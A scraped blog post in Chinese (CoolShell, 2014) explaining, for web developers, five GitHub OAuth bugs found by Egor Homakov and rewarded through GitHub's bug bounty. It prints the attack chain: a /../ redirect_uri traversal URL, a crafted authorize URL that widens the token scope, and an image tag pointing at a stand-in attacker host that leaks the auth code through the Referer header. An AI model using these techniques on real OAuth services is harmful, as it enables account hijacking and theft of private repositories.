{
  "Source": "coolshell.cn",
  "Title": "从“黑掉Github”学Web安全开发",
  "Link": "https://coolshell.cn/articles/11021.html",
  "Content": "\u003cdiv class=\"entry-content\"\u003e\n\u003cp\u003e\u003cscript async=\"\" src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\" crossorigin=\"anonymous\" type=\"7a4aa8b70dea4723bf811998-text/javascript\"\u003e\u003c/script\u003e\u003cimg decoding=\"async\" class=\"alignright\" alt=\"\" src=\"https://coolshell.cn/wp-content/uploads/2014/02/Github-Security.png\" width=\"236\" height=\"251\"/\u003eEgor Homakov（Twitter: \u003ca href=\"https://twitter.com/homakov\"\u003e@homakov\u003c/a\u003e 个人网站: \u003ca href=\"http://egorhomakov.com/\"\u003eEgorHomakov.com\u003c/a\u003e）是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——《\u003ca href=\"https://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html\" target=\"_blank\"\u003eHow I hacked Github again\u003c/a\u003e》（墙）说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，所以，\u003cstrong\u003e我在这里用我的语言给大家阐述一下黑掉Github的思路以及原文中所提到的那5个bug。希望这篇文章能让从事Web开发的同学们警惕\u003c/strong\u003e。关于Web开发中的安全事项，大家可以看看这篇文章《\u003ca title=\"Web开发中需要了解的东西\" href=\"https://coolshell.cn/articles/6043.html\" target=\"_blank\"\u003eWeb开发中的你需要了解的东西\u003c/a\u003e》\u003c/p\u003e\n\u003cdiv id=\"ez-toc-container\" class=\"ez-toc-v2_0_48 counter-hierarchy ez-toc-counter ez-toc-grey ez-toc-container-direction\"\u003e\n\u003cdiv class=\"ez-toc-title-container\"\u003e\n\u003cp class=\"ez-toc-title\"\u003e目录\u003c/p\u003e\n\u003cspan class=\"ez-toc-title-toggle\"\u003e\u003c/span\u003e\u003c/div\u003e\n\u003cnav\u003e\u003cul class=\"ez-toc-list ez-toc-list-level-1 \"\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-1\" href=\"#OAuth%E7%AE%80%E4%BB%8B\" title=\"OAuth简介\"\u003eOAuth简介\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-2\" href=\"#OAuth%E7%9A%84Callback\" title=\"OAuth的Callback\"\u003eOAuth的Callback\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-3\" href=\"#%E7%AC%AC%E4%B8%80%E4%B8%AABug_%E2%80%94_%E6%B2%A1%E6%9C%89%E6%A3%80%E6%9F%A5%E9%87%8D%E5%AE%9A%E5%90%91URL%E4%B8%AD%E7%9A%84\" title=\"第一个Bug — 没有检查重定向URL中的/../\"\u003e第一个Bug — 没有检查重定向URL中的/../\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-4\" href=\"#%E7%AC%AC%E4%BA%8C%E4%B8%AABUG_%E2%80%94_%E6%B2%A1%E6%9C%89%E6%A0%A1%E9%AA%8Ctoken\" title=\"第二个BUG — 没有校验token\"\u003e第二个BUG — 没有校验token\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-5\" href=\"#%E7%AC%AC%E4%B8%89%E4%B8%AABUG_%E2%80%94_%E6%B3%A8%E5%85%A5%E8%B7%A8%E7%AB%99%E5%9B%BE%E7%89%87\" title=\"第三个BUG — 注入跨站图片\"\u003e第三个BUG — 注入跨站图片\u003c/a\u003e\u003cul class=\"ez-toc-list-level-5\"\u003e\u003cli class=\"ez-toc-heading-level-5\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-6\" href=\"#%E5%83%8F%E7%A8%8B%E5%BA%8F%E5%91%98%E4%B8%80%E6%A0%B7%E7%9A%84%E6%80%9D%E8%80%83\" title=\"像程序员一样的思考\"\u003e像程序员一样的思考\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-7\" href=\"#%E7%AC%AC%E5%9B%9B%E4%B8%AAbug_%E2%80%93_Gist%E6%8A%8Agithub_token%E6%94%BE%E5%9C%A8%E4%BA%86cookie%E9%87%8C\" title=\"第四个bug – Gist把github_token放在了cookie里\"\u003e第四个bug – Gist把github_token放在了cookie里\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-8\" href=\"#%E7%AC%AC%E4%BA%94%E4%B8%AABug_%E2%80%93_%E8%87%AA%E5%8A%A8%E7%BB%99gist%E6%8E%88%E6%9D%83\" title=\"第五个Bug – 自动给gist授权\"\u003e第五个Bug – 自动给gist授权\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-9\" href=\"#_%E5%85%B6%E5%AE%83_%E6%84%9F%E6%83%B3\" title=\" 其它 \u0026amp; 感想\"\u003e 其它 \u0026amp; 感想\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/nav\u003e\u003c/div\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"OAuth%E7%AE%80%E4%BB%8B\"\u003e\u003c/span\u003eOAuth简介\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e首先，这个故事要从\u003ca href=\"https://developer.github.com/v3/oauth/\" target=\"_blank\"\u003eGithub OAuth\u003c/a\u003e讲起。所以，我们需要先知道什么是\u003ca href=\"https://en.wikipedia.org/wiki/OAuth\" target=\"_blank\"\u003eOAuth\u003c/a\u003e。所谓OAuth就是说，第三方的应用可以通过你的授权而不用知道你的帐号密码能够访问你在某网站的你自己的数据或功能。像Google, Facebook, Twitter等网站都提供了OAuth服务，提供OAuth服务的网站一般都有很多开放的API，第三方应用会调用这些API来开发他们的应用以让用户拥有更多的功能，但是，当用户在使用这些第三方应用的时候，这些第三方的应用会来访问用户的帐户内的功能和数据，所以，当第三应用要干这些事的时候，我们不能让第三方应用弹出一个对话框来问用户要他的帐号密码，不然第三方的应用就把用户的密码给获取了，所以，OAuth协议会跳转到一个页面，让用户授权给这个第三方应用以某些权限，然后，这个权限授权的记录保存在Google/Facebook/Twitter上，并向第三方应用返回一个授权token，于是第三方的应用通过这个token来操作某用户帐号的功能和数据时，就畅通无阻了。下图简单地说明了Twitter的OAuth的授权过程。\u003c/p\u003e\n\u003cp\u003e\u003cspan id=\"more-11021\"\u003e\u003c/span\u003e\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003e\u003cimg decoding=\"async\" loading=\"lazy\" class=\"aligncenter  wp-image-11022\" alt=\"\" src=\"https://coolshell.cn/wp-content/uploads/2014/02/oauth-authentication.png\" width=\"630\" height=\"375\" srcset=\"https://coolshell.cn/wp-content/uploads/2014/02/oauth-authentication.png 700w, https://coolshell.cn/wp-content/uploads/2014/02/oauth-authentication-300x178.png 300w\" sizes=\"(max-width: 630px) 100vw, 630px\"/\u003e\u003c/p\u003e\n\u003cp style=\"text-align: left;\"\u003e从上面的流程图中，我们可以看OAuth不管是1.0还是2.0版本都是一个比较复杂的协议，所以，在Server端要把OAuth实现对并不是一些容易事，其总是或多或少会有些小错误。Egor就找到了几个Github的OAuth的实现的问题。\u003c/p\u003e\n\u003ch4 style=\"text-align: left;\"\u003e\u003cspan class=\"ez-toc-section\" id=\"OAuth%E7%9A%84Callback\"\u003e\u003c/span\u003eOAuth的Callback\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e还需要注意的是，因为OAuth是需要跳到主站的网页上去让用户授权，当用户授权完后，需要跳转回原网页，所以，一般来说，OAuth授权页都会带一个 redirect_url的参数，用于指定跳转回原来的网页。Github使用的这个跳转参数是redirect_uri参数。一般来说，redirect_uri这个参数需要在服务器端进行验证。\u003c/p\u003e\n\u003cp\u003e你想一下，如果有人可以控制这个redirect_uri这个参数，那么，你就可以让其跳转到别的网页上（可能会是个有恶意的网页）。如果你觉得跳转到别的网页上也无所谓，那么你就错了。别忘了，当你对这个第三方的应用授权通过后，服务方会给第三方应用返回一个授权token，这个token会被加到那个redirect_uri参数后面然后跳转回去，如果这个redirect_uri被别有用心的人改一个恶意的网址后，这个token也就被转过去了，于是授权token也就被泄漏过去了。\u003c/p\u003e\n\u003cp\u003e知道了这一切，我们就可以理解Egor提的那5个bug是什么意思了。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E7%AC%AC%E4%B8%80%E4%B8%AABug_%E2%80%94_%E6%B2%A1%E6%9C%89%E6%A3%80%E6%9F%A5%E9%87%8D%E5%AE%9A%E5%90%91URL%E4%B8%AD%E7%9A%84\"\u003e\u003c/span\u003e第一个Bug — 没有检查重定向URL中的/../\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e首先，我们通过\u003ca href=\"https://developer.github.com/v3/oauth/#redirect-urls\" target=\"_blank\"\u003eGithub的 redirect_uri 的说明文档\u003c/a\u003e我们可以看到这样的说明：\u003c/p\u003e\n\u003cpre data-enlighter-language=\"html\" class=\"EnlighterJSRAW\"\u003e如果 CALLBACK URL是: http://example.com/path\n\nGOOD: https://example.com/path\nGOOD: http://example.com/path/subdir/other\n\nBAD: http://example.com/bar\nBAD: http://example.com/\nBAD: http://example.com:8080/path\nBAD: http://oauth.example.com:8080/path\nBAD: http://example.org\u003c/pre\u003e\n\u003cp\u003e而Github对于redirect_uri做了限制，要求只能跳回到 https://gist.github.com/auth/github/callback/，也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。\u003c/p\u003e\n\u003cp\u003e但是，Egor发现，Github的服务器端并没有验证.. /../../这样的情况。\u003c/p\u003e\n\u003cp\u003e于是，Egor相当于构造了一个下面这样的Redirect URL：\u003c/p\u003e\n\u003cpre style=\"font-size: 10pt;\"\u003ehttps://gist.github.com/auth/github/callback/../../../homakov/8820324?code=CODE\u003c/pre\u003e\n\u003cp\u003e于是上面的URL就相当于：\u003c/p\u003e\n\u003cpre style=\"font-size: 10pt;\"\u003ehttps://gist.github.com/homakov/8820324?code=CODE\u003c/pre\u003e\n\u003cp\u003e你可以看到，认证后的跳转网页转到了别的地方去（并非是github限制的地方）——我们知道Github的gist虽然是给你分享代码片段的，但是也可以用来定制自己的东西的（比如markdown），这个gist的网页当然是被Egor所控制的。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E7%AC%AC%E4%BA%8C%E4%B8%AABUG_%E2%80%94_%E6%B2%A1%E6%9C%89%E6%A0%A1%E9%AA%8Ctoken\"\u003e\u003c/span\u003e第二个BUG — 没有校验token\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e第一个bug其实并没有什么，如果服务器端要校验一下token是否和之前生成的token的redirect_uri一模一样，只要服务器做了这个验证，第一个bug完全没有什么用处，但是，github的服务端并没有验证。\u003c/p\u003e\n\u003cp\u003e这就是第二个bug，于是第一个和第二个bug组合起来成了一个相当有威力的安全漏洞。\u003c/p\u003e\n\u003cp\u003e也就是说，token的生成要考虑redirect_uri，这样，当URL跳转的时候，会把redirect_uri和token带到跳转页面（这里的跳转页面还是github自己的），跳转页面的服务端程序要用redirect_uri来生成一个token，看看是不是和传来的token是一个样的。这就是所谓的对URL进行签名——以保证URL的不被人篡改。一般来说，对URL签名和对签名验证的因子包括，源IP，服务器时间截，session，或是再加个salt什么的。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E7%AC%AC%E4%B8%89%E4%B8%AABUG_%E2%80%94_%E6%B3%A8%E5%85%A5%E8%B7%A8%E7%AB%99%E5%9B%BE%E7%89%87\"\u003e\u003c/span\u003e第三个BUG — 注入跨站图片\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e现在，redirect_uri带着code，安全顺利地跳到了Egor构造的网页上：\u003c/p\u003e\n\u003cpre\u003ehttps://gist.github.com/homakov/8820324?code=CODE\u003c/pre\u003e\n\u003cp\u003e但是，这个是gist的网页，你无法在这个页面上运行前端（Javascript）或后端程序（Ruby——Github是Ruby做的），现在的问题是我们怎么得到那个code，因为那个code虽然后带到了我的网页上来，但那个网页还是github和用户自己的环境。\u003c/p\u003e\n\u003cp\u003e到这里，一般来说，黑客会在这个页面上放一个诸如下面的一个链接，来引诱用户点击，：\u003c/p\u003e\n\u003cp\u003e\u0026lt;a href=http://hack.you.com/\u0026gt;私人照片\u0026lt;/a\u0026gt;\u003c/p\u003e\n\u003cp\u003e这样，当页面跳转到黑客的网站上来后，你之前的网页上的网址会被加在http头里的 Refere 参数里，这样，我就可以得到你的token了。\u003c/p\u003e\n\u003cp\u003e但是，在gist上放个链接还要用户去点一下，这个太影响“用户体验”了，最好能嵌入点外部的东西。gist上可以嵌入外站的图片，但是github的开发人员并非等闲之辈，对于外站的图片，其统统会把这些图片的url代理成github自己的url，所以，你很难搞定。\u003c/p\u003e\n\u003cp\u003e不过，我们可以用一个很诡异的技巧：\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003e\u003cb\u003e\u0026lt;img src=”///attackersite.com”\u0026gt;\u003c/b\u003e\u003c/p\u003e\n\u003cp\u003e这个是什么玩意？这个是个URL的相对路径。但是为什么会有三个///呢？呵呵。\u003c/p\u003e\n\u003ch5\u003e\u003cspan class=\"ez-toc-section\" id=\"%E5%83%8F%E7%A8%8B%E5%BA%8F%E5%91%98%E4%B8%80%E6%A0%B7%E7%9A%84%E6%80%9D%E8%80%83\"\u003e\u003c/span\u003e像程序员一样的思考\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h5\u003e\n\u003cp\u003e这个时候，我们需要以“程序员的编程思维”来思考问题——如果你是程序员，你会怎么写校验URL的程序？你一定会想到使用正则表达式，或是用程序来匹配URL中的一些pattern。于是，\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e对于绝对路径：你会匹配两个//，后面的可能会是 \u003ca href=\"/cdn-cgi/l/email-protection\" class=\"__cf_email__\" data-cfemail=\"bfcaccdacdffd7d0cccb91dcd0d2\"\u003e[email protected]\u003c/a\u003e（user@是可选的），然后可能会有:\u0026lt;n\u0026gt;端口号，然后是/，后面是服务器的路径，再往后面应该是?后面带一些参数了。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e对于相对路径：就没有绝对路径那么复杂了。就是些 .. 和 /再加上?和一些参数。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e好了，如果coolshell.cn网页中的\u0026lt;img src=\u0026gt;或\u0026lt;a href=\u0026gt;中用到的相对路径是 /host.com，那么浏览器会解释成：https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成 https://coolshell.cn///host.com。\u003c/p\u003e\n\u003cp\u003e但是，Chrome和Firefox，会把///host.com当成绝对路径，因为其正确匹配了绝对路径的scheme。如果你正在用Chrome/Firefox看这篇文章 ，你可以看看下面的连接（源码如下）：\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003e\u003ca href=\"///www.google.com\" target=\"_blank\"\u003eCoolShell Test\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode data-enlighter-language=\"html\" class=\"EnlighterJSRAW\"\u003e\u0026lt;a href=\u0026#34;///www.google.com\u0026#34;\u0026gt;CoolShell Test\u0026lt;/a\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e关键是，这个Chrome/Firefox的问题被标记成了Won’t Fix，我勒个去，基本上来说，后台的程序也有可能有这样的问题，对于Perl，Python，Ruby，Node.js，PHP带的URL检查的函数库都有这样的问题。\u003c/p\u003e\n\u003cp\u003e于是，我们就可以使用这样的方式给gist注入了一个第三方站点的图片（github的服务端没有察觉到（因为我们前面说过大多数语言的URL检查库都会被 Bypass了），但是浏览器端把这个链接解释到了第三方的站点上），于是请求这个图片的http头中的refere 中包含用户当前页面的URL，也包含了用户授权的code。\u003c/p\u003e\n\u003cp\u003e到这里，黑客Egor已经拿到用户gist的权限并可以修改或查看用户私用的gist了。但是作者并没有满足，他想要的更多。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E7%AC%AC%E5%9B%9B%E4%B8%AAbug_%E2%80%93_Gist%E6%8A%8Agithub_token%E6%94%BE%E5%9C%A8%E4%BA%86cookie%E9%87%8C\"\u003e\u003c/span\u003e第四个bug – Gist把github_token放在了cookie里\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e于是Egor在用户的cookie里找到了 github_token\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" class=\"aligncenter size-full wp-image-11030\" alt=\"\" src=\"https://coolshell.cn/wp-content/uploads/2014/02/gist_cookie.png\" width=\"395\" height=\"47\" srcset=\"https://coolshell.cn/wp-content/uploads/2014/02/gist_cookie.png 395w, https://coolshell.cn/wp-content/uploads/2014/02/gist_cookie-300x35.png 300w\" sizes=\"(max-width: 395px) 100vw, 395px\"/\u003e\u003c/p\u003e\n\u003cp\u003e但是这个token没什么用，因为授权的Scope只有gists。但是，这个token不应该放在用户端的cookie里，本身就是一个安全事故，这个东西只能放在服务端（关于Web开发中的安全事项，可以看看这篇文章《\u003ca title=\"Web开发中需要了解的东西\" href=\"https://coolshell.cn/articles/6043.html\" target=\"_blank\"\u003eWeb开发中的你需要了解的东西\u003c/a\u003e》）。\u003c/p\u003e\n\u003cp\u003e于是，Egor只能另谋出路。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E7%AC%AC%E4%BA%94%E4%B8%AABug_%E2%80%93_%E8%87%AA%E5%8A%A8%E7%BB%99gist%E6%8E%88%E6%9D%83\"\u003e\u003c/span\u003e第五个Bug – 自动给gist授权\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e因为gist是github自家的，Egor所以估计github想做得简单一点，当用户访问gist的时候，不会出弹出一个OAuth的页面来让用户授权，不然，用户就会很诧异，都是你们自家的东西，还要授权？所以，Egor猜测github应该是对gist做了自动授权，于是，Egor搞了这样的一个URL（注意其中的 redirect_uri中的scope ）\u003c/p\u003e\n\u003cp style=\"word-wrap: break-word; padding: 10px 20px 20px 30px; background-color: #eee;\"\u003ehttps://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9\u0026amp;redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%\u003cb\u003e2Fcallback/../../../homakov/8820324\u003c/b\u003e\u0026amp;response_type=code\u0026amp;\u003cb\u003escope=repo,gists,user,delete_repo,notifications\u003c/b\u003e\u003c/p\u003e\n\u003cp\u003e于是，这个redirect-uri不但帮黑客拿到了访问gist的token，而且还把授权token的scope扩大到了用户的代码库等其它权限。于是你就可以黑入用户的私有代码区了。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"_%E5%85%B6%E5%AE%83_%E6%84%9F%E6%83%B3\"\u003e\u003c/span\u003e 其它 \u0026amp; 感想\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e于是，作者从 \u003ca href=\"https://bounty.github.com/\"\u003eGithub Security Bug Bounty\u003c/a\u003e 拿到了USD $4,000的奖励！Egor一共花了从下午2点到6点一共4个小时找到了这些Bug，平均一小时1000美刀。Egor还很得瑟的说，如果Github请他做安全顾问，他只收一小时USD $400刀，这4个小时也就$1,600。呵呵。大家看看，这是多么有效率的赚钱方式。\u003c/p\u003e\n\u003cp\u003e下图是Github上的赏金猎手的排行榜（\u003ca href=\"https://bounty.github.com/index.html#leaderboard\" target=\"_blank\"\u003ehttps://bounty.github.com/index.html#leaderboard\u003c/a\u003e）你可以上去挨个看看他们找到的问题，你会发现好些安全问题都很小，有些只能说是不是很规范的问题，Github都赏了几百刀。我查看了一下github的赏金政策，github赏金至少100刀，到5000刀不等。\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003e\u003cimg decoding=\"async\" loading=\"lazy\" class=\"aligncenter  wp-image-11053\" alt=\"\" src=\"https://coolshell.cn/wp-content/uploads/2014/02/github_bounty_leaderboard.jpg\" width=\"580\" height=\"478\" srcset=\"https://coolshell.cn/wp-content/uploads/2014/02/github_bounty_leaderboard.jpg 716w, https://coolshell.cn/wp-content/uploads/2014/02/github_bounty_leaderboard-300x247.jpg 300w\" sizes=\"(max-width: 580px) 100vw, 580px\"/\u003e\u003c/p\u003e\n\u003cp\u003e让我们扪心自问一下，我们花了多少时间在玩那些“红包游戏”，而又搞到了多少红包？人家4个小时找了5个bug，挣了$4000美金。\u003cstrong\u003e老天给了你我一样的时间，我们用来抽几块钱的红包，人家用自己的技能来挣奖金。这就是人和人的差距。这就是所谓的效率\u003c/strong\u003e——你可以移步看看我写的《\u003ca title=\"加班与效率\" href=\"https://coolshell.cn/articles/10217.html\" target=\"_blank\"\u003e加班与效率\u003c/a\u003e》\u003c/p\u003e\n\u003cp\u003e（全文完）\u003c/p\u003e\n\u003cdiv style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\"\u003e\n\u003cp align=\"center\"\u003e\u003cstrong\u003e（转载本站文章请注明作者和出处 \u003ca href=\"https://coolshell.cn/\"\u003e酷 壳 – CoolShell\u003c/a\u003e ，请勿用于任何商业用途）\u003c/strong\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003cdiv class=\"wp_rp_wrap  wp_rp_vertical_m\" id=\"wp_rp_first\"\u003e\u003cdiv class=\"wp_rp_content\"\u003e\u003ch3 class=\"related_post_title\"\u003e相关文章\u003c/h3\u003e\u003cul class=\"related_post wp_rp\"\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/19395.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2019/05/Authorization-360x200-1-150x150.png\" alt=\"HTTP API 认证授权术\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/19395.html\" class=\"wp_rp_title\"\u003eHTTP API 认证授权术\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/18094.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png\" alt=\"如何免费的让网站启用HTTPS\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/18094.html\" class=\"wp_rp_title\"\u003e如何免费的让网站启用HTTPS\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/8711.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-150x150.jpg\" alt=\"程序员疫苗：代码注入\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/8711.html\" class=\"wp_rp_title\"\u003e程序员疫苗：代码注入\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/6043.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg\" alt=\"Web开发中需要了解的东西\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/6043.html\" class=\"wp_rp_title\"\u003eWeb开发中需要了解的东西\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/5987.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/12.jpg\" alt=\"如何设计“找回用户帐号”功能\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/5987.html\" class=\"wp_rp_title\"\u003e如何设计“找回用户帐号”功能\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/5353.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg\" alt=\"你会做Web上的用户登录功能吗？\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/5353.html\" class=\"wp_rp_title\"\u003e你会做Web上的用户登录功能吗？\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/div\u003e\u003c/div\u003e\n\u003cdiv id=\"post-ratings-11021\" class=\"post-ratings\" itemscope=\"\" itemtype=\"https://schema.org/Article\" data-nonce=\"f1ea68ab3e\"\u003e\u003cimg id=\"rating_11021_1\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"好烂啊\" title=\"好烂啊\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(11021, 1, \u0026#39;好烂啊\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4, 0, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-7a4aa8b70dea4723bf811998-=\"\"/\u003e\u003cimg id=\"rating_11021_2\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"有点差\" title=\"有点差\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(11021, 2, \u0026#39;有点差\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4, 0, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-7a4aa8b70dea4723bf811998-=\"\"/\u003e\u003cimg id=\"rating_11021_3\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"凑合看看\" title=\"凑合看看\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(11021, 3, \u0026#39;凑合看看\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4, 0, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-7a4aa8b70dea4723bf811998-=\"\"/\u003e\u003cimg id=\"rating_11021_4\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"还不错\" title=\"还不错\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(11021, 4, \u0026#39;还不错\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4, 0, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-7a4aa8b70dea4723bf811998-=\"\"/\u003e\u003cimg id=\"rating_11021_5\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_off.gif\" alt=\"很精彩\" title=\"很精彩\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(11021, 5, \u0026#39;很精彩\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4, 0, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-7a4aa8b70dea4723bf811998-=\"\"/\u003e (\u003cstrong\u003e56\u003c/strong\u003e 人打了分，平均分： \u003cstrong\u003e4.02\u003c/strong\u003e )\u003cbr/\u003e\u003cspan class=\"post-ratings-text\" id=\"ratings_11021_text\"\u003e\u003c/span\u003e\u003cmeta itemprop=\"name\" content=\"从“黑掉Github”学Web安全开发\"/\u003e\u003cmeta itemprop=\"headline\" content=\"从“黑掉Github”学Web安全开发\"/\u003e\u003cmeta itemprop=\"description\" content=\"Egor Homakov（Twitter: @homakov 个人网站: EgorHomakov.com）是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——《How I hacked Github again》（墙）说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，所以，我...\"/\u003e\u003cmeta itemprop=\"datePublished\" content=\"2014-02-10T08:16:11+08:00\"/\u003e\u003cmeta itemprop=\"dateModified\" 